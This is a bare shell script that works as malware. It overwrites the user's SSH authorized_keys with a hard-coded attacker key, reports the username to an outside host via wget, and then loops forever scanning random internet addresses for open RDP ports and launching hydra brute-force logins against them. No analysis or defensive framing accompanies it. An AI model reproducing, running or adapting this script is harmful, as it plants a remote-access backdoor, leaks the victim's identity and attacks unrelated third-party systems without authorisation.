#!/bin/sh
dir="$HOME/.ssh"
  file="$dir/authorized_keys"
  k="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpD3lm54lC6mCLUzG1XyJ79Ha0aPRtzU8HACTgZB2LIsk5mxcBTJ61p0Hl6H9/SthrOFWP8VpUzGzrEm8BZDbBPfMYHT08X07nk03MH1WCvzRSYV0saG4KRE/Dv+ucUwCc7iLZWqDIie3GNyK6lNY5bpOfZKwOp9vvWwJv4tMPnPS9EibF2hf63lNySm7WInnEMYY+QzobUm9BMB1ju1AeyeMmrpt1PsLgJdvrVoEnDG5XCUWPCKPFncUXAdmyx41GYyB4soEOvO2Zzmqtzyj6ZSFAkgWiNqZAKHbg7slQrTc5eJtBC2PH8x/eUdvpTmtj2WULpmhyMWp4AovZQA3p"
 if [ ! -d $dir ]; then
  mkdir $dir
  chmod 700 $dir
  touch $file
  chmod 600 $file
 fi
  echo $k >  $file
  wh=$(whoami)
  wget -q http://wuyfyy.getenjoyment.net/i.php?w=$wh &> /dev/null
while true
do
echo "Press [CTRL+C] to exit this loop..."
echo "NMAP"
sudo nmap -iR 5000 -v  -Pn -sS -p 3389  --open -n --script rdp-enum-encryption>nmaprdp.txt
grep SUCCESS -B 7 nmaprdp.txt|grep report|cut -d ' ' -f 5 > rdphosts.txt
cat rdphosts.txt >>  allrdphosts.txt
for entry in `cat rdphosts.txt`
do
echo $entry
hydra -t 1 -V -f -L u -P p rdp://$entry  >> $entry.txt &
sleep 30
done
sleep 2
done

